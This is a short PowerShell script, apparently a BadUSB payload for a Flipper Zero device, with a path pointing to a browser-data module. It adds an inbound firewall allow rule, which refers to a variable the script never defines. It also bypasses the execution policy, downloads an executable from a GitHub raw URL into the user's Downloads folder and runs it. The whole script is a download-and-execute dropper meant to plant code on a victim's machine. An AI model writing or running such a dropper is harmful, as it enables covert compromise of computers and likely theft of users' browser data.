$ruleName="testRuleWindows"
$url="https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/External/windows64.exe"
$destination=[System.IO.Path]::Combine($env:UserProfile, 'Downloads', 'windows64.exe')
New-NetFirewallRule -DisplayName $ruleName -Direction Inbound -Program $executablePath -Action Allow
Set-ExecutionPolicy Bypass -Scope Process -Force
Invoke-WebRequest -Uri $url -OutFile $destination
Start-Process -FilePath $destination -Wait